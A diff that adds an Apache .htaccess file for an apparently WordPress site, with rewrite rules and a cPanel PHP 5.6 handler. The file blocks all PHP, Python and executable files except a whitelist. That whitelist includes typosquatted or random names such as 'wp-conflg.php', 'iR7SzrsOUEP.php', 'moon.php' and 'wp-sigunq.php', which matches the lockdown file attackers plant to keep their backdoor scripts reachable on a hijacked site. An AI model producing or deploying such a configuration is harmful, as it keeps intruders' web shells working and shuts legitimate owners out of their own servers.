@@ -1,0 +1,23 @@
+<IfModule mod_rewrite.c>
+RewriteEngine On
+RewriteBase /
+RewriteRule ^index.php$ - [L]
+RewriteCond %{REQUEST_FILENAME} !-f
+RewriteCond %{REQUEST_FILENAME} !-d
+RewriteRule . index.php [L]
+</IfModule>
+<FilesMatch ".(py|exe|phtml|php|PhP|php5|suspected)$">
+Order Allow,Deny
+Deny from all
+</FilesMatch>
+<FilesMatch "^(index.php|wp-login.php|wp-blog-header.php|style.php|style2.php|wp-conflg.php|index.php|class.api.php|iR7SzrsOUEP.php|license.php|wp-blog.php|moon.php|wp-add.php|plugin-install.php|admin.php|wp-sigunq.php|my1.php|wp-add.php|license.php|config-vars-tokens.php|class.inc-api.php|config-vars-rss.php|config.widgets-nva.php|class-core-loader.php|class-site-style.php|class-widgets-rss.php|my1.php|wp-blog.php|config.core-sitemaps.php|lang-rest-nav.php|class-load-settings.php|init-widgets-locale.php|walker-nva.php|init.walker-meta.php)$">
+Order allow,deny
+Allow from all
+</FilesMatch>
+
+# php -- BEGIN cPanel-generated handler, do not edit
+# Set the “ea-php56” package as the default “PHP” programming language.
+<IfModule mime_module>
+  AddHandler application/x-httpd-ea-php56 .php .php5 .phtml
+</IfModule>
+# php -- END cPanel-generated handler, do not edit
